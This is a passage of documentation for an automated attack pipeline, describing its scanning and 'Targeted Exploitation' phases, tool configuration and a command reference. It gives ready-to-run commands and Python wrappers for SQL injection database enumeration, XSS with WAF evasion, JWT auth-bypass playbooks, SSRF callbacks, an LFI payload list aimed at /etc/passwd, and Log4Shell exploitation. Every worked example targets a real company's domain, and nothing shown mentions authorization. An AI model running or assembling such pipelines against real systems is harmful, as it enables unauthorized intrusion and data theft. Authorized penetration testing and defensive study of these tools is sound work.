base_urls = list(set([url.split('/')[0] + '//' + url.split('/')[2] for url in urls if '://' in url]))

for url in base_urls[:5]:
    output_file = self.workspace.get_raw_file(f"nikto_{safe_url}.json")

    cmd = [
        self.get_tool_path('nikto'),
        '-h', url,                       # e.g., "https://api.apple.com"
        '-Format', 'json',
        '-o', str(output_file)
    ]

    # Actual execution:
    # nikto -h https://api.apple.com -Format json \
    #       -o workspaces/apple.com/raw/nikto_https___api.apple.com.json
```

**Output Format:** JSON
```json
{
  "vulnerabilities": [
    {
      "id": "12345",
      "msg": "XSS vulnerability in search parameter",
      "severity": "2",
      "url": "/search"
    }
  ]
}
```

---

## Phase 6: Targeted Exploitation

### Tools Used
1. **sqlmap** - SQL injection exploitation
2. **ghauri** - Alternative SQLi tool
3. **dalfox** - XSS exploitation
4. **xsstrike** - Alternative XSS tool
5. **ssrfire** - SSRF exploitation
6. **jwt-tool** - JWT manipulation
7. **ffuf** - LFI/IDOR fuzzing
8. **nuclei** - CVE exploitation

---

### 1. sqlmap

**Purpose:** Automated SQL injection exploitation

**Command:**
```bash
sqlmap -u {url} -p {param} --dbs --batch --random-agent --level 3 --risk 2 --output-dir {dir} --format json
```

**Flags:**
- `-u {url}`: Target URL
- `-p {param}`: Parameter to test
- `--dbs`: Enumerate databases
- `--batch`: Non-interactive mode (default answers)
- `--random-agent`: Random User-Agent
- `--level 3`: Testing level (1-5, higher = more tests)
- `--risk 2`: Risk level (1-3, higher = more dangerous)
- `--output-dir {dir}`: Save results to directory
- `--format json`: JSON output

**Example:**
```python
output_dir = self.workspace.exploits_path / f"sqlmap_{finding.id}"
output_dir.mkdir(exist_ok=True)

cmd = [
    self.get_tool_path('sqlmap'),
    '-u', finding.url,               # e.g., "https://api.apple.com/user?id=1"
    '-p', finding.param or 'id',     # e.g., "id"
    '--dbs',
    '--batch',
    '--random-agent',
    '--level', '3',
    '--risk', '2',
    '--output-dir', str(output_dir),
    '--format', 'json'
]

# Actual execution:
# sqlmap -u https://api.apple.com/user?id=1 -p id --dbs --batch \
#        --random-agent --level 3 --risk 2 \
#        --output-dir workspaces/apple.com/exploits/sqlmap_a1b2c3d4 \
#        --format json
```

**Success Detection:**
```python
if result.success and 'database' in result.stdout.lower():
    return ExploitResult(
        finding_id=finding.id,
        exploit_success=True,
        tool_used="sqlmap",
        output_path=str(output_dir),
        evidence="Database enumeration successful",
        impact="Database access confirmed"
    )
```

---

### 2. ghauri

**Purpose:** Alternative SQLi exploitation (when sqlmap fails)

**Command:**
```bash
ghauri -u {url} -p {param} --dbs
```

**Example:**
```python
cmd = [
    self.get_tool_path('ghauri'),
    '-u', finding.url,
    '-p', finding.param or 'id',
    '--dbs'
]

# Actual execution:
# ghauri -u https://api.apple.com/user?id=1 -p id --dbs
```

---

### 3. dalfox

**Purpose:** XSS exploitation and verification

**Command:**
```bash
dalfox url {url} --param {param} --waf-evasion --silence --output {output_file}
```

**Flags:**
- `url {url}`: Target URL
- `--param {param}`: Parameter to test
- `--waf-evasion`: Use WAF bypass techniques
- `--silence`: Minimal output
- `--output {output_file}`: Save results

**Example:**
```python
output_file = self.workspace.exploits_path / f"dalfox_{finding.id}.txt"

cmd = [
    self.get_tool_path('dalfox'),
    'url', finding.url,              # e.g., "https://api.apple.com/search"
    '--param', finding.param or 'search',
    '--waf-evasion',
    '--silence',
    '--output', str(output_file)
]

# Actual execution:
# dalfox url https://api.apple.com/search --param q \
#        --waf-evasion --silence \
#        --output workspaces/apple.com/exploits/dalfox_a1b2c3d4.txt
```

---

### 4. xsstrike

**Purpose:** Alternative XSS detection

**Command:**
```bash
xsstrike -u {url} --params
```

**Example:**
```python
cmd = [
    self.get_tool_path('xsstrike'),
    '-u', finding.url,
    '--params'
]

# Actual execution:
# xsstrike -u https://api.apple.com/search --params
```

---

### 5. ssrfire

**Purpose:** SSRF exploitation with callback server

**Command:**
```bash
ssrfire -u {url} -p {param} --callback {interactsh_server}
```

**Flags:**
- `-u {url}`: Target URL
- `-p {param}`: Parameter to inject
- `--callback {server}`: Interact.sh callback server

**Example:**
```python
if self.interactsh_server:
    output_file = self.workspace.exploits_path / f"ssrf_{finding.id}.txt"

    cmd = [
        self.get_tool_path('ssrfire'),
        '-u', finding.url,
        '-p', finding.param or 'url',
        '--callback', self.interactsh_server
    ]

    # Actual execution:
    # ssrfire -u https://api.apple.com/fetch -p url \
    #         --callback your-interactsh-server.com
```

---

### 6. jwt-tool

**Purpose:** JWT token manipulation and auth bypass

**Command:**
```bash
jwt_tool {token} -t {url} -rh "Authorization: Bearer JWTTOOL_TOKEN" -M pb
```

**Flags:**
- `{token}`: JWT token to test
- `-t {url}`: Target URL
- `-rh {header}`: Request header with token placeholder
- `-M pb`: Playbook mode (common attacks)

**Example:**
```python
# Extract JWT from finding evidence
jwt_token = finding.evidence if 'eyJ' in finding.evidence else None

if jwt_token:
    cmd = [
        self.get_tool_path('jwt_tool'),
        jwt_token,
        '-t', finding.url,
        '-rh', 'Authorization: Bearer JWTTOOL_TOKEN',
        '-M', 'pb'
    ]

    # Actual execution:
    # jwt_tool eyJhbGciOiJIUzI1NiIs... -t https://api.apple.com/admin \
    #          -rh "Authorization: Bearer JWTTOOL_TOKEN" -M pb
```

---

### 7. ffuf (LFI Exploitation)

**Purpose:** LFI payload fuzzing

**Command:**
```bash
ffuf -u {url}?{param}=FUZZ -w {wordlist} -mc 200 -o {output} -of json
```

**Example:**
```python
# Create LFI payloads wordlist
lfi_payloads = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "php://filter/read=convert.base64-encode/resource=index.php"
]

wordlist_file = self.workspace.exploits_path / f"lfi_wordlist_{finding.id}.txt"
with open(wordlist_file, 'w') as f:
    f.write('\n'.join(lfi_payloads))

output_file = self.workspace.exploits_path / f"lfi_{finding.id}.json"

cmd = [
    self.get_tool_path('ffuf'),
    '-u', f"{finding.url}?{finding.param or 'file'}=FUZZ",
    '-w', str(wordlist_file),
    '-mc', '200',
    '-o', str(output_file),
    '-of', 'json'
]

# Actual execution:
# ffuf -u https://api.apple.com/page?file=FUZZ \
#      -w workspaces/apple.com/exploits/lfi_wordlist_a1b2c3d4.txt \
#      -mc 200 -o workspaces/apple.com/exploits/lfi_a1b2c3d4.json -of json
```

---

### 8. nuclei (CVE Exploitation)

**Purpose:** Exploit specific CVEs with templates

**Command:**
```bash
nuclei -u {url} -t {template} -json -o {output}
```

**Example:**
```python
if finding.template:
    output_file = self.workspace.exploits_path / f"cve_{finding.id}.json"

    cmd = [
        self.get_tool_path('nuclei'),
        '-u', finding.url,
        '-t', finding.template,        # e.g., "CVE-2021-44228"
        '-json',
        '-o', str(output_file)
    ]

    # Actual execution:
    # nuclei -u https://api.apple.com/login -t CVE-2021-44228 \
    #        -json -o workspaces/apple.com/exploits/cve_a1b2c3d4.json
```

---

## Tool Execution Summary

### Execution Model

All tools are executed via `AsyncRunner` with:
- **Rate limiting:** Global semaphore (default 50 concurrent)
- **Timeout:** Per-tool timeout (default 300 seconds)
- **Parallelism:** `asyncio.gather()` for concurrent execution
- **Error handling:** `return_exceptions=True` (one tool failure doesn't stop others)

### Input/Output Flow

```
Phase Input → Tool Command → Raw Output → Parsing → Structured Data → Phase Output
```

### Fallback Strategy

| Tool Missing | Fallback Behavior |
|--------------|-------------------|
| subfinder | Continue with other discovery tools |
| amass | Use subfinder + assetfinder only |
| dnsx | Assume all subdomains valid |
| httpx | Create basic probes with status: 0 |
| masscan/nmap | Skip port scanning |
| wafw00f | Assume no WAF |
| katana/gospider | Use alternative crawlers |
| ffuf/feroxbuster | Skip directory enumeration |
| paramspider/arjun/x8 | Use available parameter tools |
| secretfinder/trufflehog | Skip secret hunting |
| nuclei | Skip vulnerability scanning |
| sqlmap/ghauri | Manual SQLi PoC only |
| dalfox/xsstrike | Manual XSS PoC only |

---

## Configuration Reference

### Tool Path Configuration

```yaml
tools:
  # Go tools (usually in ~/go/bin/ or /usr/local/bin/)
  subfinder: /usr/local/bin/subfinder
  amass: /usr/local/bin/amass
  assetfinder: /usr/local/bin/assetfinder
  dnsx: /usr/local/bin/dnsx
  httpx: /usr/local/bin/httpx
  katana: /usr/local/bin/katana
  ffuf: /usr/local/bin/ffuf
  dalfox: /usr/local/bin/dalfox
  gf: /usr/local/bin/gf
  waybackurls: /usr/local/bin/waybackurls
  gau: /usr/local/bin/gau
  gospider: /usr/local/bin/gospider
  hakrawler: /usr/local/bin/hakrawler
  nuclei: /usr/local/bin/nuclei

  # Python tools (pip installed)
  arjun: arjun
  ghauri: ghauri
  trufflehog: trufflehog

  # Git tools (in /opt/)
  sqlmap: /usr/local/bin/sqlmap        # Wrapper script
  paramspider: /usr/local/bin/paramspider
  secretfinder: /usr/local/bin/secretfinder
  wafw00f: /usr/local/bin/wafw00f
  nikto: /usr/local/bin/nikto
  linkfinder: /usr/local/bin/linkfinder
  xsstrike: /usr/local/bin/xsstrike
  ssrfire: /usr/local/bin/ssrfire
  jwt_tool: /usr/local/bin/jwt-tool
  gitdorker: /usr/local/bin/gitdorker

  # Compiled tools
  masscan: /usr/local/bin/masscan
  nmap: /usr/bin/nmap
  feroxbuster: /usr/local/bin/feroxbuster
  x8: /usr/local/bin/x8
```

### Rate Limiting

```yaml
rate_limit: 50    # Global requests per second across all tools
threads: 20       # Parallel operations
```

**Tool-Specific Behavior:**
- **masscan:** Uses `--rate` flag (separate from global limit)
- **nuclei:** Uses `-rate-limit` flag (matches global config)
- **ffuf:** Uses `-t` for threads (not rate-limited)
- **katana:** Uses `-concurrency` flag

---

## Quick Reference: Commands by Phase

| Phase | Tool | Key Flags | Output |
|-------|------|-----------|--------|
| 1 | subfinder | `-d -silent -o` | Plain text |
| 1 | amass | `enum -passive/active -d -o` | Plain text |
| 1 | assetfinder | `--subs-only` | stdout |
| 1 | dnsx | `-l -silent -o` | Plain text |
| 1 | httpx | `-l -silent -o` | Plain text |
| 2 | httpx | `-l -tech-detect -status-code -title -json` | JSONL |
| 2 | masscan | `-iL -p1-65535 --rate -oJ` | JSON |
| 2 | nmap | `-sV -iL -oJ` | JSON |
| 2 | wafw00f | `-o` | JSON |
| 3 | katana | `-u -headless -js-crawl -depth -o` | Plain text |
| 3 | gospider | `-s -o -t --depth` | Directory |
| 3 | waybackurls | (domain) | stdout |
| 3 | gau | (domain) | stdout |
| 3 | linkfinder | `-i -o cli` | stdout |
| 4 | ffuf | `-u -w -t -mc -o -of json` | JSON |
| 4 | feroxbuster | `-u -w -t --json -o` | JSONL |
| 4 | paramspider | `-d -o` | Directory |
| 4 | arjun | `-u -oJ` | JSON |
| 4 | x8 | `-u -w -o` | JSON |
| 4 | gf | (pattern) (file) | stdout |
| 5 | secretfinder | `-i -o cli` | stdout |
| 5 | trufflehog | `filesystem --json -o` | JSONL |
| 5 | nuclei | `-l -t -severity -json -o` | JSONL |
| 5 | nikto | `-h -Format json -o` | JSON |
| 6 | sqlmap | `-u -p --dbs --batch --output-dir` | JSON/Dir |
| 6 | dalfox | `url --param --waf-evasion --output` | File |
| 6 | ssrfire | `-u -p --callback` | File |
| 6 | jwt_tool | `-t -rh -M` | stdout |
| 6 | ffuf | `-u -w -mc -o` | JSON |
| 6 | nuclei | `-u -t -json -o` | JSON |
